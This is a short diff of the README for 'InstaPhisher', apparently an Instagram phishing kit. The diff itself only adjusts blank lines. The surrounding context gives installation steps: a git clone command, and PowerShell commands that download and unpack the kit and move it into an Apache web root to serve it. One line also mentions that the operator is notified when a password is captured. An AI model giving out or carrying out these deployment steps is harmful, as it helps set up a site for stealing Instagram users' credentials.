@@ -28,9 +28,7 @@ The InstaPhisher file is only used to notify you when a new password is captured
 
 # Install
 
-
 ## Linux
-
 
 ```
 git clone https://github.com/ExilasP/InstaPhisher.git
@@ -117,6 +115,7 @@ Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/a
 Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\InstaPhisher.zip" -DestinationPath "%userprofile%\Downloads\InstaPhisher"
 Powershell.exe Move-Item -Path "%userprofile%\Downloads\InstaPhisher\InstaPhisher-master\*" -Destination "C:\Apache24\htdocs\"
 ```
+
 
 # Notice
 
